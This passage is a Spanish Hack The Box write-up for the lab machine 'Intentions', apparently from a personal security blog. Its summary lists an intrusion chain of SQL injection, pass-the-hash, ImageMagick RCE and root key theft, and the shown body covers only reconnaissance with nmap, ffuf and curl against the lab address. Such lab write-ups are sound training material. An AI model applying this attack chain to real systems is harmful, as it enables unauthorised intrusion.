@@ -1,0 +1,626 @@
+<!doctype html><html lang="es"><head><title>Intentions | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene un sitio web con una API vulnerable a SQLi de segundo orden. Luego, hay un mecanismo de autenticación que solo requiere del hash de la contraseña, por lo que podemos tomar un hash de la base de datos e iniciar sesión como administrador. Luego, hay una vulnerabilidad que involucra PHP e ImageMagick que conduce a RCE. Una vez en la máquina, podemos pivotar al usuario greg analizando un repositorio de Git y encontrando credenciales en texto claro. Después de eso, se nos permite ejecutar un binario personalizado que aplica un hash a una determinada longitud de un archivo y compara el resultado con un conjunto de hashes MD5 precomputados. Este binario tiene una capability que permite leer archivos como root, que puede usarse para extraer todo el contenido de cualquier archivo después de automatizar el proceso, qlo cual puede usarse para leer una clave privada de SSH para root"><meta name="image" content="https://7rocky.github.io/images/HTB/Intentions/Intentions.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene un sitio web con una API vulnerable a SQLi de segundo orden. Luego, hay un mecanismo de autenticación que solo requiere del hash de la contraseña, por lo que podemos tomar un hash de la base de datos e iniciar sesión como administrador. Luego, hay una vulnerabilidad que involucra PHP e ImageMagick que conduce a RCE. Una vez en la máquina, podemos pivotar al usuario greg analizando un repositorio de Git y encontrando credenciales en texto claro. Después de eso, se nos permite ejecutar un binario personalizado que aplica un hash a una determinada longitud de un archivo y compara el resultado con un conjunto de hashes MD5 precomputados. Este binario tiene una capability que permite leer archivos como root, que puede usarse para extraer todo el contenido de cualquier archivo después de automatizar el proceso, qlo cual puede usarse para leer una clave privada de SSH para root"><meta itemprop="keywords" content="git,api,php,vue,laravel,capabilities,crypto,jwt,sqli,password-reuse,rce,"><meta itemprop="name" content="Intentions"><meta property="article:published_time" content="2023-10-14T00:00:00+00:00"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene un sitio web con una API vulnerable a SQLi de segundo orden. Luego, hay un mecanismo de autenticación que solo requiere del hash de la contraseña, por lo que podemos tomar un hash de la base de datos e iniciar sesión como administrador. Luego, hay una vulnerabilidad que involucra PHP e ImageMagick que conduce a RCE. Una vez en la máquina, podemos pivotar al usuario greg analizando un repositorio de Git y encontrando credenciales en texto claro. Después de eso, se nos permite ejecutar un binario personalizado que aplica un hash a una determinada longitud de un archivo y compara el resultado con un conjunto de hashes MD5 precomputados. Este binario tiene una capability que permite leer archivos como root, que puede usarse para extraer todo el contenido de cualquier archivo después de automatizar el proceso, qlo cual puede usarse para leer una clave privada de SSH para root"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Intentions/Intentions.webp"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Intentions"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/intentions/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene un sitio web con una API vulnerable a SQLi de segundo orden. Luego, hay un mecanismo de autenticación que solo requiere del hash de la contraseña, por lo que podemos tomar un hash de la base de datos e iniciar sesión como administrador. Luego, hay una vulnerabilidad que involucra PHP e ImageMagick que conduce a RCE. Una vez en la máquina, podemos pivotar al usuario greg analizando un repositorio de Git y encontrando credenciales en texto claro. Después de eso, se nos permite ejecutar un binario personalizado que aplica un hash a una determinada longitud de un archivo y compara el resultado con un conjunto de hashes MD5 precomputados. Este binario tiene una capability que permite leer archivos como root, que puede usarse para extraer todo el contenido de cualquier archivo después de automatizar el proceso, qlo cual puede usarse para leer una clave privada de SSH para root"><meta name="twitter:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene un sitio web con una API vulnerable a SQLi de segundo orden. Luego, hay un mecanismo de autenticación que solo requiere del hash de la contraseña, por lo que podemos tomar un hash de la base de datos e iniciar sesión como administrador. Luego, hay una vulnerabilidad que involucra PHP e ImageMagick que conduce a RCE. Una vez en la máquina, podemos pivotar al usuario greg analizando un repositorio de Git y encontrando credenciales en texto claro. Después de eso, se nos permite ejecutar un binario personalizado que aplica un hash a una determinada longitud de un archivo y compara el resultado con un conjunto de hashes MD5 precomputados. Este binario tiene una capability que permite leer archivos como root, que puede usarse para extraer todo el contenido de cualquier archivo después de automatizar el proceso, qlo cual puede usarse para leer una clave privada de SSH para root"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Intentions/Intentions.webp"><meta name="twitter:title" content="Intentions"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/htb/intentions/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><script>MathJax={loader:{load:["[tex]/noerrors"]},options:{ignoreHtmlClass:"tex2jax_ignore",processHtmlClass:"tex2jax_process",skipHtmlTags:["noscript","pre","script","style","textarea"]},tex:{autoload:{color:[],colorv2:["color"]},displayMath:[["$$","$$"]],inlineMath:[["$","$"]],packages:{"[+]":["noerrors"]},processEnvironments:!0,processEscapes:!0}}</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script><div id="math-consts" style="display:none">$
+\newcommand{\e}{e}
+\newcommand{\N}[1][]{\mathbb{N}^{#1}}
+\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
+\newcommand{\R}[1][]{\mathbb{R}^{#1}}
+\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
+\newcommand{\C}[1][]{\mathbb{C}^{#1}}
+\newcommand{\dx}{\,\mathrm{d}x}
+\newcommand{\dy}{\,\mathrm{d}y}
+\newcommand{\dz}{\,\mathrm{d}z}
+\newcommand{\dt}{\,\mathrm{d}t}
+\newcommand{\divides}{\, | \,}
+\newcommand{\st}{\; | \;}
+\renewcommand{\geq}{\geqslant}
+\renewcommand{\leq}{\leqslant}
+\renewcommand{\i}{\mathrm{i}}
+\newcommand{\rank}{\mathop{\mathrm{rank}}}
+\newcommand{\gcd}{\mathop{\mathrm{gcd}}}
+\newcommand{\tr}{\mathop{\mathrm{tr}}}
+\newcommand{\charField}{\mathop{\mathrm{char}}}
+\newcommand{\Image}{\mathop{\mathrm{Im}}}
+$</div><script src="/js/imc.js"></script>
+<script>(async()=>await typeset(()=>[`#math-consts`]))()</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/intentions/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/intentions/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/intentions/&amp;text=Intentions" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/intentions/&amp;title=Intentions" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Intentions</h1><time class="mt4 f6 dib tracked" datetime="2023-10-14T00:00:00+01:00">14 / 10 / 2023</time><br><p class="mb4 f6 dib tracked">19 minutos de lectura</p></header><div class="htb-image"><img alt="Intentions" src="/images/HTB/Intentions/Intentions.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/git" title="Git">Git</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/api" title="API">API</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/vue" title="Vue.js">Vue.js</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/laravel" title="Laravel">Laravel</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/capabilities" title="<em>Capabilities</em>"><em>Capabilities</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/crypto" title="Criptografía">Criptografía</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/jwt" title="JSON Web Token">JSON Web Token</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sqli" title="Inyección de código SQL">Inyección de código SQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#enumeración-de-la-api">Enumeración de la API</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#inyección-de-código-sql">Inyección de código SQL</a></li><li><a href="#_pass-the-hash_"><em>Pass the Hash</em></a></li><li><a href="#ejecución-remota-de-comandos">Ejecución remota de comandos</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-greg">Movimiento lateral al usuario <code>greg</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#lectura-de-archivos-como-root">Lectura de archivos como <code>root</code></a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Difícil</li><li><strong>Dirección IP</strong>: 10.10.11.220</li><li><strong>Fecha</strong>: 01 / 07 / 2023</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.94 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.220 -p 22,80
+Nmap scan report for 10.10.11.220
+Host is up (0.042s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
+|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Intentions
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 9.83 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.220</code> veremos este formulario de inicio de sesión:</p><p><img src="/images/HTB/Intentions/Intentions-1.webp" alt="Intentions 1"></p><p>En primer lugar, intentemos registrar una cuenta:</p><p><img src="/images/HTB/Intentions/Intentions-2.webp" alt="Intentions 2"></p><p>Ahora estamos registrados:</p><p><img src="/images/HTB/Intentions/Intentions-3.webp" alt="Intentions 3"></p><p>Y podemos iniciar sesión en la plataforma:</p><p><img src="/images/HTB/Intentions/Intentions-4.webp" alt="Intentions 4"></p><p>El sitio web trata sobre imágenes:</p><p><img src="/images/HTB/Intentions/Intentions-5.webp" alt="Intentions 5"></p><p>Además, el <em>front-end</em> está construido con Vue.js, ya que JavaScript renderiza el código HTML en tiempo de ejecución:</p><p><img src="/images/HTB/Intentions/Intentions-6.webp" alt="Intentions 6"></p><p><img src="/images/HTB/Intentions/Intentions-7.webp" alt="Intentions 7"></p><p>Dado que la página es dinámica, no es útil aplicar <em>fuzzing</em> con <code>ffuf</code>. Tendremos que analizar los archivos de JavaScript para encontrar las diferentes páginas del sitio web:</p><p><img src="/images/HTB/Intentions/Intentions-8.webp" alt="Intentions 8"></p><p>No hay páginas ocultas, todas aparecen en la barra lateral del sitio web.</p><p>Tenemos algunas <em>cookies</em> interesantes:</p><p><img src="/images/HTB/Intentions/Intentions-9.webp" alt="Intentions 9"></p><p>Se parecen a los <em>tokens</em> JWT, pero solo <code>token</code> es un JWT (podemos decodificarlo en <a href="https://jwt.io">jwt.io</a>):</p><p><img src="/images/HTB/Intentions/Intentions-10.webp" alt="Intentions 10"></p><p>La <em>cookie</em> <code>intentions_session</code> y <code>XSRF_TOKEN</code> son solo documentos JSON codificados en Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> eyJpdiI6IlRHaEJRNlNvcmRCUTFRd1RkVmE1RHc9PSIsInZhbHVlIjoiUmdjZWVxaks3VjJDZGtJelhkMW5hQk1GVlkrS0hnaGRnNk9HL0NWVHZKV25WWEE5V3ljVlBxNGluOTRxeDRSUCs4RjJDaGdmUkVqS2dQd0FrbkhhZ2NBekd2OEF2TDQ2bFhUZzdUQ0hyOGRzWFpuWVlXTWRtWGVabDV0WHkvbnIiLCJtYWMiOiJlMjhkOWRhZTQ5ODY1NDUwZDcxOGY3Nzg4YzlkMGVlOGJlMWE0ZDliNjRjMDZhZTZmNmUxYzc1ZTk1OWI4YjRlIiwidGFnIjoiIn0= | <span class="code-dark-green">base64</span> -d | <span class="code-dark-green">jq</span>  
+<span class="code-white">{</span>
+<span class="code-white">  <span class="code-blue">"iv"</span></span><span class="code-white">: </span><span class="code-dark-green">"TGhBQ6SordBQ1QwTdVa5Dw=="</span><span class="code-white">,</span>
+<span class="code-white">  <span class="code-blue">"value"</span></span><span class="code-white">: </span><span class="code-dark-green">"RgceeqjK7V2CdkIzXd1naBMFVY+KHghdg6OG/CVTvJWnVXA9WycVPq4in94qx4RP+8F2ChgfREjKgPwAknHagcAzGv8AvL46lXTg7TCHr8dsXZnYYWMdmXeZl5tXy/nr"</span><span class="code-white">,</span>
+<span class="code-white">  <span class="code-blue">"mac"</span></span><span class="code-white">: </span><span class="code-dark-green">"e28d9dae49865450d718f7788c9d0ee8be1a4d9b64c06ae6f6e1c75e959b8b4e"</span><span class="code-white">,</span>
+<span class="code-white">  <span class="code-blue">"tag"</span></span><span class="code-white">: </span><span class="code-dark-green">""</span>
+<span class="code-white">}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> eyJpdiI6InVKa09NVjhCWjJYc0lrVEVKeXhNamc9PSIsInZhbHVlIjoiM2VGZzNTVldRWEQxelZrR2lWYTdsNUV0NXd0TkdwVlhOUHBFY2FLN2dJNlN4UXNQOVZlUU5QUWh1Y1FpM1BJQkx4cElrb2pSTlhJL1c1SHJYS09Ib2JUZ0F1S3hOV3kyTXlWa2k1ZGdnUWxIb1hMamU0Wm9BSUx5SFRWNDNZbWciLCJtYWMiOiJmNTVjNDFlMWNiMGI1Yzg5ZWQ0N2JhOWZjNDU3ODJmZjhjMmNhYjNjMjRiZTk1NmRhY2FmMWQ5MzI0ZmQ4OGQ3IiwidGFnIjoiIn0= | <span class="code-dark-green">base64</span> -d | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+<span class="code-white">  <span class="code-blue">"iv"</span></span><span class="code-white">: </span><span class="code-dark-green">"uJkOMV8BZ2XsIkTEJyxMjg=="</span><span class="code-white">,</span>
+<span class="code-white">  <span class="code-blue">"value"</span></span><span class="code-white">: </span><span class="code-dark-green">"3eFg3SVWQXD1zVkGiVa7l5Et5wtNGpVXNPpEcaK7gI6SxQsP9VeQNPQhucQi3PIBLxpIkojRNXI/W5HrXKOHobTgAuKxNWy2MyVki5dggQlHoXLje4ZoAILyHTV43Ymg"</span><span class="code-white">,</span>
+<span class="code-white">  <span class="code-blue">"mac"</span></span><span class="code-white">: </span><span class="code-dark-green">"f55c41e1cb0b5c89ed47ba9fc45782ff8c2cab3c24be956dacaf1d9324fd88d7"</span><span class="code-white">,</span>
+<span class="code-white">  <span class="code-blue">"tag"</span></span><span class="code-white">: </span><span class="code-dark-green">""</span>
+<span class="code-white">}</span>
+</code></pre></div><h3 id="enumeración-de-la-api">Enumeración de la API</h3><p>En la sección de datos del <em>token</em> JWT vemos que <code>iss</code> contiene <code>http://10.10.11.220/api/v1/auth/login</code>. Por lo tanto, tenemos un <em>endpoint</em> de API para enumerar. Ahora podemos usar <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://10.10.11.220/api/v1/auth/FUZZ -fs 162  
+
+<span class="code-dark-yellow">[Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 77ms]</span>
+    * FUZZ: login
+
+<span class="code-dark-blue">[Status: 302, Size: 330, Words: 60, Lines: 12, Duration: 92ms]</span>
+    * FUZZ: user
+
+<span class="code-dark-yellow">[Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 141ms]</span>
+    * FUZZ: register
+
+<span class="code-dark-yellow">[Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 100ms]</span>
+    * FUZZ: logout
+
+<span class="code-dark-red">[Status: 500, Size: 6615, Words: 443, Lines: 37, Duration: 399ms]</span>
+    * FUZZ: refresh
+</code></pre></div><p>Muy bien, nada muy útil por el momento. Obsérvese lo de <code>v1</code>, tal vez haya una versión más nueva de la API, veamos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://10.10.11.220/api/FUZZ/auth/login -fs 162  
+
+<span class="code-dark-yellow">[Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 120ms]</span>
+    * FUZZ: v2
+
+<span class="code-dark-yellow">[Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 403ms]</span>
+    * FUZZ: v1
+</code></pre></div><p>Genial, así que tenemos dos versiones API. Con Burp Suite, podemos averiguar cómo se envía la petición de inicio de sesión:</p><p><img src="/images/HTB/Intentions/Intentions-11.webp" alt="Intentions 11"></p><p>Podemos replicarla con <code>curl</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/auth/login -d <span class="code-dark-yellow">'{"email":"asdf@asdf.com","password":"asdffdsa"}'</span>
+{"status":"error","errors":{"email":["The email field is required."],"password":["The password field is required."]}}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.220/api/v1/auth/login -d <span class="code-dark-yellow">'{"email":"asdf@asdf.com","password":"asdffdsa"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
+{"status":"success","name":"asdf"}
